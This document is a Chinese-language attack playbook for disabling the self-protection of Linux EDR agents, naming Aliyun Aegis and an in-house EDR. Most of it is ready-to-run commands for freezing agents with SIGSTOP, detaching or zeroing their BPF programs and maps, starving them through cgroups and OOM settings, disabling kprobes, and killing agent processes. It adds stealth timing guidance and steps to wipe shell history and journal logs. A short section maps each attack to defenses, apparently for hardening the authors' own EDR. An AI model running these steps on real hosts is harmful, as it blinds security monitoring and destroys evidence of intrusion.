# EDR Breaker — Linux EDR 自保护攻破方法论

> 基于对阿里云 Aegis v12.93 与自研 EDR v0.8 双向攻防实战总结
> 核心哲学: **低调、有序、原生** — 用 Linux 自身的机制测试 Linux EDR 的防御

---

## 目录

- [一、攻击全景矩阵](#一攻击全景矩阵)
- [二、三步法：探测 → 绕过 → 清除](#二三步法探测--绕过--清除)
- [三、分层攻击武器库](#三分层攻击武器库)
- [四、防御层次对应关系](#四防御层次对应关系)
- [五、噪声控制策略](#五噪声控制策略)
- [六、实战 Checklist](#六实战-checklist)

---

## 一、攻击全景矩阵

一个 EDR 的自保护可由以下维度被攻击。**打勾 ✅ = 某个 EDR 存在此漏洞**。

| # | 攻击向量 | Linux 原生方法 | 典型阻防 | Aegis v12 | 自研 v0.8 |
|:---:|------|------|------|:---:|:---:|
| 1 | 终止信号 | `kill -9 <pid>` | LSM `security_task_kill` / kprobe override | ✅ 阻断 | ✅ 阻断 |
| 2 | **冻结信号** | `kill -19 <pid>` (SIGSTOP) | LSM `security_task_kill` (常被遗漏) | 🔴 可冻结 | 🔴 可冻结 |
| 3 | **继续信号** | `kill -18 <pid>` (SIGCONT) | 同上 | 🔴 | 🔴 |
| 4 | ptrace 附加 | `ptrace(PTRACE_ATTACH)` | kprobe `__x64_sys_ptrace` | 🔴 检测不阻断 | ✅ 阻断+反杀 |
| 5 | 进程内存读写 | `process_vm_readv/writev` | tracepoint / kprobe | 🔴 检测不阻断 | ✅ 阻断 |
| 6 | /proc/PID/mem | `open/read/write /proc/<pid>/mem` | fanotify on /proc | 🔴 可读 | ⚠ 未单独保护 |
| 7 | BPF 链接解除 | `bpftool link detach` | LSM `security_bpf*` (fmod_ret) | 🔴 检测不阻断 | ❌ 无保护 |
| 8 | BPF map 清零 | `bpftool map update agent_pid value 0` | LSM `security_bpf_map` | 🔴 | ❌ 无保护 |
| 9 | 全局禁用 kprobe | `echo 0 > /sys/kernel/debug/kprobes/enabled` | fanotify on debugfs | 🔴 可写 | ✅ fanotify 阻断 |
| 10 | 删除二进制 | `rm /opt/edr/edr-agent` | fanotify FAN_OPEN_PERM | 🔴 可删 | ✅ inode 阻断 |
| 11 | 覆写配置 | `echo x > /etc/edr/policy.json` | fanotify | 🔴 可写 | ✅ 阻断 |
| 12 | 目录重命名 | `mv /opt/edr /opt/edr.old` | fanotify | 🔴 可重命名 | ⚠ 未单独保护 |
| 13 | OOM 优先级篡改 | `echo 1000 > /proc/<pid>/oom_score_adj` | — | 🔴 | ❌ 无保护 |
| 14 | cgroup freezer | `echo 1 > cgroup.freeze` | — | 🔴 | ❌ 无保护 |
| 15 | 内核模块插入 | `insmod rootkit.ko` | kprobe `init_module` | ⚠ 检测 | ✅ 检测 |
| 16 | seccomp 策略降级 | `prctl(PR_SET_SECCOMP, ...)` | `security_task_prctl` | ⚠ 检测 | ❌ 无保护 |
| 17 | reboot 强制重启 | `reboot -f` | — | 可执行 | 可执行 (但会断业务) |
| 18 | systemctl 正常停止 | `systemctl stop edr-agent` | admin token | 无此功能 | ✅ admin token 阻断 |

> **规律**: Aegis 大量使用"检测不阻断"的遥测探针，自研 EDR 使用 enforcement 探针但有覆盖盲区（特别是 BPF 自保护）。

---

## 二、三步法：探测 → 绕过 → 清除

### Phase 1: 探测 (Reconnaissance)

**目标**: 判断目标 EDR 存在哪些防护层，比选出最薄弱的一环。

```
Step 1.1 进程发现
  ps aux | grep -iE "edr|aegis|agent|defender|sec|falco|wazuh|osquery"
  → 记录所有 EDR 相关进程 PID 及父子关系

Step 1.2 BPF 探针枚举
  bpftool prog list                    # 列出所有 BPF 程序
  bpftool link list                    # 列出所有 BPF 链接
  → 识别 LSM fmod_ret 是否存在（modret_security_task_kill / handle_kill 等）
  → 识别 bpf_guard 是否存在（security_bpf_prog / security_bpf_map）
  → 识别 ptrace 保护是否存在

Step 1.3 fanotify 状态检查
  ls -la /proc/<edr_pid>/fd | grep fanotify    # 查找 fanotify fd
  ls -la /proc/<edr_pid>/fdinfo/               # 检查 fanotify 标记
  → 确认哪些路径被 fanotify 保护

Step 1.4 文件系统防护测试（低风险探测）
  touch /opt/edr/.test_write 2>&1               # 测试 EDR 目录是否可写
  cat /etc/edr/some_config 2>&1                 # 测试配置是否可读
  → 避免直接删除，只用 touch/cat 做最小探测

Step 1.5 信号响应测试（从最弱信号开始）
  kill -0 <edr_pid> 2>&1                        # 探测进程存在性（无害）
  → 不要从 kill -9 开始！
```

**探测结果分类**:

| 探测发现 | 攻击策略 |
|---------|---------|
| 无 BPF 程序 | 直接 kill -9 (如在网关类机器上) |
| 有 LSM fmod_ret 但无 bpf_guard | Phase 2 → bpftool 路径 |
| 有 bpf_guard (security_bpf*) | Phase 2 → cgroup/OOM 路径 |
| 有 fanotify 文件保护 | Phase 2 → 目录重命名绕过 |
| LSM + bpf_guard + fanotify 全开 | Phase 2 → SIGSTOP + reboot 终极路径 |

### Phase 2: 绕过 (Bypass)

**原则**: 从最低调的绕过方式开始，逐级升级。

```
路径 A: 信号绕过 (攻击非终止信号)
──────────────────────────────────
适用: EDR 有 kill 防护但无 SIGSTOP 防护
风险: 低 (不产生 EPERM 日志)
步骤:
  kill -19 <edr_pid>        # 冻结进程
  # 进程仍在内存中但完全停止响应
  # 此时可以做文件操作而不被检测


路径 B: BPF 链接解除 (攻击 LSM hook)
──────────────────────────────────
适用: EDR 有 modret_security_task_kill 但无 security_bpf_prog 阻断
前提: 已完成路径 A (进程已冻结) 或确认 security_bpf 仅检测
风险: 中 (bpftool 操作会留下痕迹)
步骤:
  # 找到 kill 保护的 BPF 链接
  bpftool link list | grep -B1 "security_task_kill\|handle_kill"
  # 解除链接
  bpftool link detach id <LINK_ID>
  # 验证保护已消失
  kill -0 <edr_pid> && echo "still alive (no protection)"


路径 C: cgroup 窒息 (绕过信号机制)
──────────────────────────────────
适用: 所有 EDR (cgroup 操作不走 LSM security_task_kill)
前提: 系统使用 cgroup v2
风险: 低 (cgroup 操作是正常系统管理行为)
步骤:
  CGROUP=$(cat /proc/<edr_pid>/cgroup | head -1 | cut -d: -f3)
  echo 1 > /sys/fs/cgroup${CGROUP}/cgroup.freeze    # 冻结整个 cgroup
  # 或限制资源使其自然崩溃:
  echo 1M > /sys/fs/cgroup${CGROUP}/memory.max
  echo 1000 > /proc/<edr_pid>/oom_score_adj         # 优先被 OOM 杀死


路径 D: 文件系统绕过
──────────────────────────────────
适用: EDR 有 fanotify 文件保护
前提: fanotify 基于路径而非 inode
风险: 中 (rename 比 unlink 低调)
步骤:
  mv /opt/edr /opt/edr.disabled        # 重命名目录
  # 如果 EDR 基于路径匹配，保护失效
  # 如果 EDR 基于 inode，此方法无效 → 使用其他路径


路径 E: 全局禁用 kprobe (终极核弹)
──────────────────────────────────
适用: EDR 主要依赖 kprobe 做阻断 (非 LSM)
前提: debugfs 可写 (无 fanotify 保护)
风险: 高 (影响全系统)
步骤:
  echo 0 > /sys/kernel/debug/kprobes/enabled
  # 所有 kprobe 失效 → EDR 自保护全部崩塌
```

### Phase 3: 清除 (Neutralization)

**原则**: 确认防护已解除后，一次性执行，减少操作窗口。

```
Step 3.1 确认所有防护已解除
  # 检查 BPF link 是否断开
  bpftool link list | grep "security_task_kill" || echo "kill protection: OFF"
  # 检查进程是否仍存活
  ps -p <edr_pid> -o comm=

Step 3.2 按进程树顺序斩杀 (从子到父，或利用 init 孤儿化)
  # 方式一: 杀父进程，让子进程变孤儿（配合 oom_score_adj）
  echo 1000 > /proc/<child_pid>/oom_score_adj
  kill -9 <parent_pid>
  # 方式二: 逐个 kill (如果 kill 路径已开放)
  for pid in $(pgrep -f "edr|agent|aegis"); do kill -9 $pid; done

Step 3.3 清理残留文件
  # 优先使用 EDR 自身的卸载逻辑
  /etc/init.d/aegis uninstall 2>/dev/null
  # 或: mv 到不显眼的路径
  mv /opt/edr /tmp/.edr_backup

Step 3.4 验证清理完成
  # 等待 30-60s，确认无进程复活
  sleep 60
  ps aux | grep -iE "edr|agent|aegis"  # 应无输出
  bpftool prog list | grep -c "edr\|aegis\|selfprotect"  # 应为 0
```

---

## 三、分层攻击武器库

### 3.1 信号攻击 (Signal Attacks)

```
┌──────────────────────────────────────────────────┐
│  信号      内核路径              被 LSM 保护？   │
├──────────────────────────────────────────────────┤
│  SIGKILL(9)   security_task_kill     ✅ 通常保护  │
│  SIGTERM(15)  security_task_kill     ✅ 通常保护  │
│  SIGHUP(1)    security_task_kill     ✅ 通常保护  │
│  SIGINT(2)    security_task_kill     ⚠ 可能放行  │
│  SIGQUIT(3)   security_task_kill     ⚠ 可能放行  │
│  SIGSTOP(19)  security_task_kill     ❌ 常被遗漏  │
│  SIGCONT(18)  security_task_kill     ❌ 常被遗漏  │
│  SIGTSTP(20)  security_task_kill     ❌ 常被遗漏  │
│  SIGUSR1(10)  security_task_kill     ⚠ 看实现    │
│  SIGUSR2(12)  security_task_kill     ⚠ 看实现    │
└──────────────────────────────────────────────────┘

攻击策略: 先试 19(SIGSTOP) → 18(SIGCONT) → 20(SIGTSTP) → 再试 2(SIGINT)
永远不要从 SIGKILL 开始！
```

### 3.2 BPF 操作攻击 (BPF Manipulation)

```bash
# 武器 1: 清零 agent_pid map (使自保护失能)
bpftool map update id <MAP_ID> key 0 0 0 0 value 0 0 0 0

# 武器 2: 卸载 kill 保护程序
bpftool link detach id $(bpftool link list | grep -B1 "security_task_kill" | grep -oP '^\d+')

# 武器 3: 冻结 BPF map (使其不可更新)
bpftool map freeze id <MAP_ID>

# 武器 4: 查找并固定→删除关键程序
bpftool prog pin id <PROG_ID> /sys/fs/bpf/target
rm /sys/fs/bpf/target
```

### 3.3 进程操作攻击 (Process Manipulation)

```bash
# 武器 1: cgroup freezer (cgroup v2)
echo 1 > /sys/fs/cgroup/<edr_cgroup>/cgroup.freeze

# 武器 2: OOM 偏好设置
echo 1000 > /proc/<edr_pid>/oom_score_adj

# 武器 3: 内存限制导致 OOM
mkdir /sys/fs/cgroup/<edr_cgroup>/child
echo <edr_pid> > /sys/fs/cgroup/<edr_cgroup>/child/cgroup.procs
echo 1M > /sys/fs/cgroup/<edr_cgroup>/child/memory.max

# 武器 4: CPU 限制使其无法响应
echo 1000 1000 > /sys/fs/cgroup/<edr_cgroup>/cpu.max

# 武器 5: PR_SET_PDEATHSIG — 父进程退出时子进程也退出
# (需要注入代码到 EDR 进程，难度高)
```

### 3.4 文件系统攻击 (Filesystem Attacks)

```bash
# 武器 1: 目录重命名 (绕过基于路径的 fanotify)
mv /opt/edr /opt/edr.killed

# 武器 2: bind mount 覆盖
mount --bind /tmp/empty /opt/edr

# 武器 3: 利用 EDR 自有卸载脚本
/etc/init.d/aegis uninstall        # 如果存在
rm -f /etc/init.d/aegis             # 防止重启后复原

# 武器 4: 覆写关键配置使其失效
echo "enabled=false" > /etc/edr/config.json
```

### 3.5 调试攻击 (Debugging Attacks)

```bash
# 武器 1: ptrace 附加
python3 -c "import ctypes; libc=ctypes.CDLL('libc.so.6'); libc.ptrace(16, <pid>, 0, 0)"

# 武器 2: 读取进程内存
dd if=/proc/<edr_pid>/mem bs=1 count=64 skip=$((0x400000))

# 武器 3: process_vm_readv (读取远程进程内存)
python3 -c "
import ctypes, os, struct
libc = ctypes.CDLL('libc.so.6')
pid = <edr_pid>
buf = ctypes.create_string_buffer(64)
local_iov = struct.pack('P', ctypes.addressof(buf)) + struct.pack('Q', 64)
remote_iov = struct.pack('P', 0x400000) + struct.pack('Q', 64)
libc.process_vm_readv(pid, local_iov, 1, remote_iov, 1, 0)
print(buf.raw[:32].hex())
"
```

---

## 四、防御层次对应关系

理解 EDR 的防御架构后，每条攻击路径对应的防护层一目了然：

```
攻击路径                     →  防护层 (正常应拦截)        →  你需要在哪个 BPF 探针中实现
═══════════════════════════════════════════════════════════════════════════════
kill -9                      →  LSM security_task_kill     →  selfprotect.bpf.c (kprobe)
kill -19 (SIGSTOP)           →  LSM security_task_kill     →  selfprotect.bpf.c (需补)
ptrace ATTACH                →  kprobe __x64_sys_ptrace    →  ptrace_enh.bpf.c
process_vm_writev            →  kprobe __x64_sys_process_vm_writev → selfprotect.bpf.c
bpftool link detach          →  LSM security_bpf_prog      →  bpf_guard.bpf.c (需改为fmod_ret)
bpftool map update           →  LSM security_bpf_map       →  bpf_guard.bpf.c (需改为fmod_ret)
echo 0 > kprobes/enabled     →  fanotify on debugfs        →  fanotify.go + SELF004规则
rm /opt/edr/edr-agent        →  fanotify FAN_OPEN_PERM     →  fanotify.go + SELF001规则
系统重启                      →  无 (物理层面无法阻止)       →  重启后自动恢复 + 完整性校验
```

**关键设计原则**: 
- kprobe 适合做 **enforcement** (可以 `bpf_send_signal` 反杀) 但不能改返回值
- LSM fmod_ret 适合做 **内核级阻断** (可以返回 `-EPERM`) 但不能发信号
- **两者叠加才能形成完整保护**: LSM 阻断攻击 → kprobe 记录事件

---

## 五、噪声控制策略

### 5.1 操作分级 (从低调到高调)

| 级别 | 操作类型 | 示例 | 留下痕迹 |
|:---:|------|------|:---:|
| 🟢 0级 | 只读探测 | `ps aux`, `bpftool prog list`, `cat /proc/PID/status` | 几乎无 |
| 🟡 1级 | 进程状态修改 | `kill -19`, `echo 1 > cgroup.freeze` | 少量 |
| 🟠 2级 | BPF 操作 | `bpftool link detach`, `bpftool map update` | bpf() syscall 记录 |
| 🔴 3级 | 进程终止 | `kill -9`, `pkill` | 大量 syscall |
| 💀 4级 | 文件销毁 | `rm -rf`, 批量 unlink | 大量磁盘操作 |

**攻击顺序必须从 0 级开始逐级递升**，每步间隔 >= 5 分钟。

### 5.2 时间窗口控制

```
错误模式 (20min内完成): 探测 → kill → 删除 → bpftool → 斩杀
正确模式 (60-90min):  探测(等20min) → SIGSTOP(等15min) → bpftool(等15min) → 斩杀
```

### 5.3 隐蔽替代方案

| 原操作 | 隐蔽替代 | 原理 |
|--------|---------|------|
| `kill -9 <pid>` | `echo 1M > memory.max` (cgroup) | 进程被 OOM，不触发 LSM |
| `rm -rf /opt/edr` | `mv /opt/edr /tmp/.x` | rename 而非 unlink |
| `bpftool link detach` | 直接 kill 持有 BPF 引用的父进程 | 内核自动清理，无 bpftool 痕迹 |
| `ptrace ATTACH` | `dd if=/proc/PID/mem` | 不触发 ptrace 探针 |
| `curl` 下载工具 | 提前本地缓存，通过 SSH pipeline 注入 | 无外连 |

---

## 六、实战 Checklist

### 6.1 攻击前准备

- [ ] 确认本次攻击目标: EDR 名称、版本、运行状态
- [ ] 记录攻击前基线: `uptime`, `ps aux`, `bpftool prog list`, `dmesg | tail`
- [ ] 准备本地工具链: bpftool, Python3, curl (避免攻击中下载)
- [ ] 设置时间预算: 预计 60-90 分钟完成完整攻击链
- [ ] 开启审计日志记录自身操作 (`script` 命令)

### 6.2 Phase 1: 探测 (15 min)

- [ ] 1.1 枚举所有 EDR 进程及父子关系
- [ ] 1.2 列出所有 BPF 程序和链接，识别防护类型
- [ ] 1.3 检查 fanotify 是否激活及保护路径
- [ ] 1.4 `touch` 测试 EDR 目录写权限
- [ ] 1.5 `kill -0` 探测进程 (不做任何实际攻击)
- [ ] 1.6 分析结果，选择攻击路径

### 6.3 Phase 2: 绕过 (30-45 min)

按优先级选择路径 (从最低调到最高调):

- [ ] **路径 A (SIGSTOP)**: 优先级 ⭐⭐⭐⭐⭐
  - `kill -19 <all_edr_pids>` — 间隔每条 30s
  - 验证进程已冻结: `cat /proc/<pid>/status | grep State`
  
- [ ] **路径 B (BPF 链接)**: 优先级 ⭐⭐⭐⭐
  - `bpftool link list | grep kill` — 找到目标链接
  - `bpftool link detach id <LINK_ID>` — 解除
  - 验证保护已解除
  
- [ ] **路径 C (cgroup)**: 优先级 ⭐⭐⭐
  - 确认 cgroup v2 可用: `ls /sys/fs/cgroup/cgroup.controllers`
  - 冻结 cgroup 或设置内存限制
  
- [ ] **路径 D (文件系统)**: 优先级 ⭐⭐
  - `mv` 目录绕过 fanotify
  - 或写入配置使 EDR 失能

### 6.4 Phase 3: 清除 (10 min)

- [ ] 确认所有防护已解除 (再次检查 BPF link 和 fanotify)
- [ ] 按进程树从子到父斩杀
- [ ] 清理文件残留 (优先用 EDR 自身卸载)
- [ ] 等待 60s 确认无复活
- [ ] 记录最终状态

### 6.5 攻击后清理

- [ ] 清理自己的操作痕迹:
  - 清除 `~/.bash_history` 中与本攻击相关的命令
  - 清除 `/tmp` 中的临时文件
  - 若有条件，清除 journalctl 相关日志
- [ ] 记录本次攻击发现的所有漏洞
- [ ] 更新自研 EDR 的防护 TODO
